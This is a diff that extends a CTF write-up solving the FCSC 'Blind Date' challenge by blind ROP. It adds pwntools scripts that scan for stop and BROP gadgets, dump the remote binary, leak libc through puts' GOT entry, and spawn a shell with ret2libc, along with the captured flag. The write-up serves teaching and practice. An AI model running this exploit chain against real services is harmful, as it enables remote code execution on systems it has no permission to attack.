@@ -1,5 +1,7 @@
 # Blind Date
 
+*Author: Ewaël*
+
 The France CyberSecurity Challenge (FCSC) had some really interesting challenges this year. One of them was a classic blind ROP exploitation but because it was my first one, I was so hyped to solve it that I thought it would be really nice to explain the exploit step by step.
 
 <p align="center">
@@ -475,11 +477,415 @@ f.close()
 
 ![leakbin](images/leakbin.png)
 
-That was quick, and boom, there we have!
+That was quick, and boom, there we have! The binary of the remote service! Are you not entertained?
 
 ```
 $ file binary 
 binary: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, missing section headers
 ```
 
-Then we can load it in [Ghidra](https://ghidra-sre.org) to get all the informations we need.
+### Getting a GOT address
+
+Then we can load it in [Ghidra](https://ghidra-sre.org) to get all the informations we need. The first thing we can notice is that we were not THAT far from the reality when trying to reconstitute the code ourselves:
+
+<p align="center">
+    <img src="images/ghidra_main.png">
+</p>
+
+<p align="center">
+    <img src="images/ghidra_vuln.png">
+</p>
+
+Of course I renamed every functions myself based on deductions. So, we now need a GOT address to leak, like the `puts` one as we know it is called at least once before the leak so the relocation has been done.
+
+<p align="center">
+    <img src="images/ghidra_puts.png">
+</p>
+
+Here it is: `0x600fc8` is the GOT address of `puts`! We can now leak it and build our final payload!
+
+### ret2libc - the final strike
+
+So, first we need to leak the libc address at the GOT address we just found. As we know that we're leaking `puts` GOT entry, we can then deduce the libc version using [this awesome tool](https://libc.blukat.me). Easy right?
+
+Yes, but be careful. In order to have a leak we need a way to flush `stdout`. And if we make the binary crash then we will never the output of `puts`. But now that we have `main` address with Ghidra, we can easily go back at the beginning, forcing a new execution of `puts` with the reference string, thus flushing `stdout`.
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+from Crypto.Util.number import bytes_to_long
+
+# known constants we need
+ref = b'Hello you.\nWhat is your name ?\n>>> '
+pop_rdi = 0x400743
+puts_plt = 0x4004f5
+puts_got = 0x600fc8
+main = 0x4006b4
+
+# connect to server
+r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
+
+# build payload
+pld = b'a' * 40                         # fill buffer
+pld += p64(pop_rdi) + p64(puts_got)     # load puts got entry to leak it
+pld += p64(puts_plt)                    # puts(puts_got)
+pld += p64(main)                        # return on `main`
+
+# send payload
+r.recv(timeout=0.1)
+r.send(pld)
+rec = r.recv()
+
+# parse the leaked address
+libc_leak = bytes_to_long(rec[rec.index(b'@')+1:rec.index(b'\n' + ref)][::-1])
+log.success(f'libc_leak = {hex(libc_leak)}')
+```
+
+![libc](images/libc.png)
+
+It works! Why do we always have the same 3 last digits? Because the libc base address is always aligned on `0x1000` and the offsets inside the libc are the always same, and this is precisely why we can deduce the libc version:
+
+<p align="center">
+    <img src="images/libcdb.png">
+</p>
+
+We already know that we have a 64 bits binary, so no doubts about which library to download to automate the search of the offsets we need. Because ASLR is on, we need to both leak the libc address and send our final exploit in the same execution, which is easy because we already go back at `main` after the leak, so we can send a new payload again!
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+from Crypto.Util.number import bytes_to_long
+
+# known constants we need
+ref = b'Hello you.\nWhat is your name ?\n>>> '
+pop_rdi = 0x400743
+puts_plt = 0x4004f5
+puts_got = 0x600fc8
+main = 0x4006b4
+
+# connect to server
+r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
+
+# build payload
+pld = b'a' * 40                         # fill buffer
+pld += p64(pop_rdi) + p64(puts_got)     # load puts got entry to leak it
+pld += p64(puts_plt)                    # puts(puts_got)
+pld += p64(main)                        # return on `main`
+
+# send payload
+r.recv(timeout=0.1)
+r.send(pld)
+rec = r.recv()
+
+# parse the leaked address
+libc_leak = bytes_to_long(rec[rec.index(b'@')+1:rec.index(b'\n' + ref)][::-1])
+log.success(f'libc_leak = {hex(libc_leak)}')
+
+# resolve offets with the leak
+libc = ELF('src/libc6_2.19-18_deb8u10_amd64.so')
+libc_base = libc_leak - libc.sym['puts']
+system = libc_base + libc.sym['system']
+binsh = libc_base + next(libc.search(b'/bin/sh'))
+
+# final payload - fatality
+pld = b'a' * 40                     # fill buffer
+pld += p64(pop_rdi) + p64(binsh)    # load `/bin/sh` ptr in `rdi`
+pld += p64(system)                  # system("/bin/sh")
+
+# enjoy the shell :)
+r.send(pld)
+r.interactive()
+r.close()
+```
+
+![shell](images/shell.png)
+
+Boom! We have our shell and we can read the flag! What a journey... Let's see the whole exploit before we conclude.
+
+## The full exploit
+
+I commented function calls to avoid waiting time during gadgets search.
+
+```python
+#!/usr/bin/env python3
+
+# nc challenges2.france-cybersecurity-challenge.fr 4008
+
+# documentation on BROP:
+# https://www.dailysecurity.fr/blind-rop-arm-securevault-writeup
+# https://blog.acolyer.org/2016/06/22/hacking-blind
+# https://0xswitch.fr/CTF/ecw-2020-pwn-zatoishi
+# https://wiki.x10sec.org/pwn/linux/stackoverflow/medium-rop/#blind-rop
+
+from pwn import *
+from Crypto.Util.number import bytes_to_long
+import os
+
+def leakAddr():
+    c = b'a'
+    pld = c * 8 # starts with 0x7f and ends with a37 -> 0x7f2fd6d2ca37 - libc
+    pld = c * 24 # starts with 0x7ff and end with 0 -> 0x7fff753ff490 - stack
+    pld = c * 32 # starts with 0x7ff and end with 0 -> 0x7ffc1b9b1330 - stack
+    pld = c * 40 # addr = 0x4006cc
+
+    # connect to the server and send payload
+    r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
+    r.recv(timeout=0.1)
+    r.send(pld)
+    leaks = r.recv(timeout=0.1).split()
+
+    # format address so we can read it
+    bye = leaks[-1][leaks[-1].rfind(c) + 1:-4][::-1]
+    l = []
+    for i in range(0, len(bye), 6):
+        l.append(bytes_to_long(bye[i:i + 6]))
+    return l[0]
+
+def getStopGadget(base_addr, ref):
+    L = [] # where we stock found addresses
+    start = 0x500
+    end = start + 0x300
+
+    for i in range(start, end):
+        # connect to server
+        context.log_level='error'
+        r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
+        context.log_level='info'
+
+        try:
+            # build payload
+            addr = base_addr + i
+            log.info(f'trying addr = {hex(addr)}')
+            pld = b'c' * 40     # fill buffer
+            pld += p64(addr)    # rip
+
+            # send and check output for the reference
+            r.recv(timeout=0.1)
+            r.send(pld)
+            res = r.recv(timeout=0.1)
+            if ref in res:
+                L.append(addr) # this address is a stop gadget
+
+        # nothing, close socket and continue
+        except:
+            pass
+        context.log_level='error'
+        r.close()
+        context.log_level='info'
+
+    return L # return a list of addresses
+
+def getBropGadget(stop_gadget, false_positives):
+    # iterate over the whole ELF
+    start = 0
+    end = start + 0x1000
+    L = []
+
+    for i in range(start, end):
+        # connect to server
+        context.log_level='error'
+        r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
+        context.log_level='info'
+
+        try:
+            # build payload
+            addr = base_addr + i
+            pld = b'c' * 40             # fill buffer
+            pld += p64(addr)            # overwrite `rip` with gadget
+            pld += p64(0) * 6           # 6 addresses popped into registers
+            pld += p64(stop_gadget)     # regain exec flow control with the `ret`
+
+            # send payload and receive response
+            log.info(f'trying addr = {hex(addr)}')
+            r.recv(timeout=0.1)
+            r.send(pld)
+            res = r.recv(timeout=0.1)
+
+            if ref in res:
+                # /!\ be careful with false positives /!\
+                if addr not in false_positives:
+                    L.append(addr)
+
+        # nothing found, close socket and continue
+        except:
+            pass
+        context.log_level='error'
+        r.close()
+        context.log_level='info'
+
+    # return found gadgets
+    return L
+
+def getPutsAddr(stop_gadget, pop_rdi):
+    # iterate over the whole ELF
+    start = 0x0
+    end = start + 0x1000
+
+    for i in range(start, end):
+        # connect to server
+        context.log_level='error'
+        r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
+        context.log_level='info'
+
+        try:
+            # build payload
+            addr = 0x400000 + i
+            pld = b'c' * 40         # fill buffer
+            pld += p64(pop_rdi)     # load `pop rdi; ret` opcodes in `rdi`
+            pld += p64(pop_rdi)     # puts arg = '\x5f\xc3'
+            pld += p64(addr)        # puts addr
+            pld += p64(stop_gadget) # stop gadget
+
+            # send payload and receive response
+            log.info(f'getPutsAddr({hex(stop_gadget)}, {hex(pop_rdi)}) -> trying addr = {hex(addr)}')
+            r.recv(timeout=0.1)
+            r.send(pld)
+            res = r.recv(timeout=0.1)
+            if b'\x5f\x3c' in res:
+                return addr
+
+        # nothing found, close socket and continue
+        except:
+            pass
+        context.log_level='error'
+        r.close()
+        context.log_level='info'
+
+    # fail, not the right gadget
+    return None
+
+def leakAddr(pop_rdi, puts_plt, leak_addr, stop_gadget):
+    # connect to server
+    context.log_level='error'
+    r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
+    context.log_level='info'
+    log.info(f'leakAddr({hex(leak_addr)})')
+
+    # build payload
+    pld = b'a' * 40                         # fill buffer
+    pld += p64(pop_rdi) + p64(leak_addr)    # load addr we want to leak in `rdi`
+    pld += p64(puts_plt)                    # puts addr with the arg we control
+    pld += p64(stop_gadget)                 # stop gadget
+
+    # send payload
+    r.recv(timeout=0.1)
+    r.send(pld)
+
+    # if no more output
+    try:
+        rec = r.recv()
+    except:
+        return None
+
+    data = b'\x00'
+    try:
+        data = rec[rec.index(b'@')+1:rec.index(b'\n' + ref)] # parse output to get the leak
+    except: # null byte
+        pass
+
+    # close socket and return the leak
+    context.log_level='error'
+    r.close()
+    context.log_level='info'
+    return data if data else b'\x00'
+
+ref = b'Hello you.\nWhat is your name ?\n>>> '
+base_addr = 0x400000
+
+#leak = leakAddr()
+leak = 0x4006cc
+log.success(f'leaked addr = {hex(leak)}')
+
+#stop_gadgets = getStopGadget(leak) # generate a list of false positives
+#stop_gadget = stop_gadgets[0]
+stop_gadgets = [0x400560, 0x400562, 0x400563, 0x400565, 0x400566, 0x400567,
+        0x400569, 0x40056d, 0x40056e, 0x40056f, 0x400570, 0x400576, 0x400577,
+        0x4006b4, 0x4006b5, 0x4006b6, 0x4006b8, 0x40073b]
+stop_gadget = 0x400560
+log.success(f'stop_gadget = {hex(stop_gadget)}')
+log.success(f'stop_gadgets = {[hex(i) for i in stop_gadgets]}')
+
+#brop_gadgets = getBropGadget(stop_gadget, stop_gadgets)
+brop_gadgets = [0x4005ee, 0x40073a]
+log.success(f'brop_gadgets = {[hex(i) for i in brop_gadgets]}')
+
+#for brop_gadget in brop_gadgets:
+#    brop_gadget += 0x9
+#    log.info(f'trying brop_gadget = {hex(brop_gadget)}')
+#    puts_addr = getPutsAddr(stop_gadget, brop_gadget)
+#    if puts_addr:
+#        log.success(f'brop_gadget = {hex(brop_gadget)}')
+#        log.success(f'puts_addr = {hex(puts_addr)}')
+#        break
+pop_rdi = 0x400743
+puts_plt = 0x4004f5
+log.success(f'pop_rdi = {hex(pop_rdi)}')
+log.success(f'puts_plt = {hex(puts_plt)}')
+
+# lets dump the whole binary from 0x400000 too 0x401000
+#binary = b''
+#leak_addr = base_addr
+#while leak_addr < base_addr + 0x1000:
+#    data = leakAddr(pop_rdi, puts_plt, leak_addr, stop_gadget)
+#    leak_addr += len(data)
+#    binary += data
+#f = open('binary', 'wb')
+#f.write(binary)
+#f.close()
+
+# ghidra as binary -> rebase then dissas -> find puts
+# entry point at 0x400550
+# qword ptr [DAT_00600fc8]
+puts_got = 0x600fc8
+vuln = 0x400656
+main = 0x4006b4
+log.success(f'puts_got = {hex(puts_got)}')
+log.success(f'vuln = {hex(vuln)}')
+log.success(f'main = {hex(main)}')
+
+# ret2libc
+r = remote('challenges2.france-cybersecurity-challenge.fr', 4008)
+
+pld = b'a' * 40
+pld += p64(pop_rdi) + p64(puts_got)
+pld += p64(puts_plt)
+pld += p64(main)
+
+r.recv(timeout=0.1)
+r.send(pld)
+rec = r.recv()
+libc_leak = bytes_to_long(rec[rec.index(b'@')+1:rec.index(b'\n' + ref)][::-1])
+log.success(f'libc_leak = {hex(libc_leak)}')
+
+libc = ELF('src/libc6_2.19-18_deb8u10_amd64.so')
+libc_base = libc_leak - libc.sym['puts']
+system = libc_base + libc.sym['system']
+binsh = libc_base + next(libc.search(b'/bin/sh'))
+
+pld = b'a' * 40
+pld += p64(pop_rdi) + p64(binsh)
+pld += p64(system)
+pld += p64(stop_gadget)
+
+r.send(pld)
+r.interactive()
+r.close()
+
+# FCSC{3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50b989dc010f28}
+```
+
+![flag](images/flag.png)
+
+## Conclusion
+
+This by far one the most exciting challenge I've ever done. I know this is just a classic blind ROP execution but that was my first ever and it's definitly worth the try. I can't thank \J enough for his crazy challenges that make everyone better every year.
+
+I hope this writeup was clear, I tried to make it as detailed as possible for beginners too, see you next year!
+
+```
+FCSC{3bf7861167a72f521dd70f704d471bf2be7586b635b40d3e5d50b989dc010f28}
+```
+
+~ Ewaël
